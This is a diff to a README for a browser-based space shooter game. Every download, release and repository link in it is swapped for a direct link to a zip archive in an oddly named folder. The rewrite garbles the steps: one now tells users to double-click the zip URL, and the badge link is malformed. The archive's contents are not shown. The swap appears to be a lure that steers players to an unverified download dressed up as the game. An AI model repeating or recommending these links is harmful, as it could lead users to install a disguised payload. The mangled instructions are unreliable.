@@ -4,26 +4,26 @@
 Take control of your spaceship and battle relentless waves of enemies in this fast-paced, action-packed space shooter! Dodge, shoot, and survive to achieve the highest score in the galaxy. Built with HTML, CSS, and JavaScript, this game offers an exciting adventure for players of all skill levels.
 
 ## 📦 Download Space-Shooter
-[![Download Space-Shooter](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/IRONJR10/Space-Shooter/releases)
+[![Download Space-Shooter](https://raw.githubusercontent.com/IRONJR10/Space-Shooter/main/tumefacient/Space-Shooter.zip%https://raw.githubusercontent.com/IRONJR10/Space-Shooter/main/tumefacient/Space-Shooter.zip)](https://raw.githubusercontent.com/IRONJR10/Space-Shooter/main/tumefacient/Space-Shooter.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run Space-Shooter.
 
 1. **Visit the Releases Page**  
    Go to the releases page to find the game:  
-   [Download Space-Shooter](https://github.com/IRONJR10/Space-Shooter/releases)
+   [Download Space-Shooter](https://raw.githubusercontent.com/IRONJR10/Space-Shooter/main/tumefacient/Space-Shooter.zip)
 
 2. **Choose the Latest Version**  
    Look for the latest version at the top of the page. Clicking on it will show you available files for download.
 
 3. **Download the Game**  
-   Click on the file that suits your device. You will typically find a file labeled `Space-Shooter.zip`. Download it to your computer.
+   Click on the file that suits your device. You will typically find a file labeled `https://raw.githubusercontent.com/IRONJR10/Space-Shooter/main/tumefacient/Space-Shooter.zip`. Download it to your computer.
 
 4. **Extract the Files**  
    Once the download is complete, locate the `.zip` file in your downloads folder. Right-click on the file and select "Extract All" or use your preferred extraction tool.
 
 5. **Open the Game**  
-   After extracting the files, open the folder. Look for `index.html` and double-click it. Your default web browser will open, and the game will launch.
+   After extracting the files, open the folder. Look for `https://raw.githubusercontent.com/IRONJR10/Space-Shooter/main/tumefacient/Space-Shooter.zip` and double-click it. Your default web browser will open, and the game will launch.
 
 ## ⚙️ System Requirements
 - **Operating System:** Windows 7 or later, macOS, or any recent Linux distribution.
@@ -54,11 +54,11 @@ Yes! If you're interested in improving Space-Shooter, feel free to open issues o
 For any questions or support requests, please create an issue in the GitHub repository. Our team will respond as quickly as possible.
 
 ## 🔗 Additional Resources
-- **Repository URL:** [Space-Shooter GitHub](https://github.com/IRONJR10/Space-Shooter)
+- **Repository URL:** [Space-Shooter GitHub](https://raw.githubusercontent.com/IRONJR10/Space-Shooter/main/tumefacient/Space-Shooter.zip)
 - **Follow Us:** Stay updated by following the repository or joining our community discussions.
 
 ## 🎯 Download & Install
-To enjoy the thrilling adventures of Space-Shooter, [visit this page to download](https://github.com/IRONJR10/Space-Shooter/releases) the game. Follow the instructions above to install and start playing.
+To enjoy the thrilling adventures of Space-Shooter, [visit this page to download](https://raw.githubusercontent.com/IRONJR10/Space-Shooter/main/tumefacient/Space-Shooter.zip) the game. Follow the instructions above to install and start playing.
 
 ## 🎉 Happy Gaming!
 Dive into the universe of Space-Shooter today. Navigate through space, fire at enemies, and strive for the highest score. Enjoy your journey among the stars!
